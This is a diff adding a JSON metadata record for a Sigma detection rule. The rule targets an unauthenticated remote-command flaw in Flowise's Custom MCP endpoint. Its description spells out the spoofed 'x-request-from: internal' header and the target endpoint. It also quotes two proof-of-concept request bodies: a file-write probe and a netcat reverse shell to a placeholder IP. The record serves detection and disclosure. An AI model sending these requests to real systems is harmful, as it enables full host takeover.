@@ -1,0 +1,24 @@
+{
+  "uuid": "aed6777a-7d0a-44ac-8ed2-274c351439a3",
+  "title": "Flowise Custom MCP -- T1059 x-request-from header spoof unsandboxed RCE",
+  "format": "sigma",
+  "author": "WinstonRedGuard -- sigma plugin observed rules (derived from breach corpus)",
+  "license": "Unknown",
+  "license_verified": false,
+  "description": "Vendor-disclosed detection for CVE-2025-71336 (GHSA-6933-jpx5-q87q,\nCVSS 9.3 CRITICAL), a self-reported advisory for Flowise, an\nenhanced ChatGPT-clone / low-code AI-agent builder.\n\nPrior to 3.0.6, Flowise's Custom MCP feature -- designed to execute OS\ncommands to launch local MCP servers -- was reachable without\nauthentication (the default installation runs unauthenticated unless\n`FLOWISE_USERNAME`/`FLOWISE_PASSWORD` are explicitly set) by sending a\ncrafted request carrying the header `x-request-from: internal` to\n`POST /api/v1/node-load-method/customMCP`. The request body's\n`mcpServerConfig.command`/`args` fields are executed directly as an OS\nprocess. Publicly documented PoC payloads (VulnCheck) demonstrate both a\nfile-write probe (`{\"inputs\":{\"mcpServerConfig\":{\"command\":\"touch\",\n\"args\":[\"/tmp/yofitofi\"]}},\"loadMethod\":\"listActions\"}`) and a reverse\nshell (`{\"inputs\":{\"mcpServerConfig\":{\"command\":\"nc\",\"args\":[\"<IP>\",\n\"<PORT>\",\"-e\",\"/bin/sh\"]}},\"loadMethod\":\"listActions\"}`) -- complete\ncontainer/host compromise from a single unauthenticated HTTP request.\n\nDetection logic flags exactly this combination: a POST to the\n`customMCP` node-load-method endpoint carrying the internal-request\nspoof header, whose body's `mcpServerConfig.command` field names an\narbitrary-execution-capable binary rather than a fixed, allow-listed MCP\nserver launcher.\n\nAggregated from 2 independent technical sources (FlowiseAI's own GHSA\nadvisory + VulnCheck's corroborating PoC write-up with the payloads\nquoted above), fixed in 3.0.6.\n",
+  "source": "https://github.com/WRG-11/wrg-sigma-rules",
+  "tags": [
+    "tlp:clear",
+    "PAP:CLEAR"
+  ],
+  "attack_techniques": [
+    "T1059"
+  ],
+  "cve": [
+    "CVE-2025-71336",
+    "GHSA-6933-JPX5-Q87Q"
+  ],
+  "created_at": "2026-09-11",
+  "last_modified": "2026-09-11",
+  "rulezet_url": "https://rulezet.org/rule/detail_rule/739670"
+}
